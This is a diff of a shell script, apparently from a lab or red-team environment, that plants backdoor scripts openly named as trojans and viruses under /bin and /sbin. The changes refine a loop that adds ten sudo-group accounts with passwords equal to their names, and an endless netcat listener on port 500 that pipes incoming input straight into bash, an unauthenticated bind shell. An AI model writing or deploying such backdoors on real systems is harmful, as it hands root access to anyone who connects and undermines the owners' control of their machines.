@@ -67,13 +67,9 @@ chmod 755 /bin/trojan.sh
 
 cat << EOF > /sbin/let_us_in_VIRUS.sh
 #!/bin/bash
-while true
+for i in {1..10}
 do
-  for i in {1..10}
-  do
-  /usr/sbin/useradd -m -g sudo -p $(openssl passwd -crypt $i) $i
-  done
-sleep 600
+/usr/sbin/useradd -M -g sudo -p \$(openssl passwd -crypt \$i) \$i 2&>/dev/null
 done
 EOF
 chmod 755 /sbin/let_us_in_VIRUS.sh
@@ -83,11 +79,7 @@ cat << EOF > /sbin/..........................open.....up.......vIrUs.........sh
 #!/bin/bash
 while true
 do
-  for i in {5000..5009}
-  do
-  /bin/nc -l -p $(i) | /bin/bash
-  done
-sleep 600
+  /bin/nc -l -p 500 | /bin/bash
 done
 EOF
 chmod 755 /sbin/..........................open.....up.......vIrUs.........sh
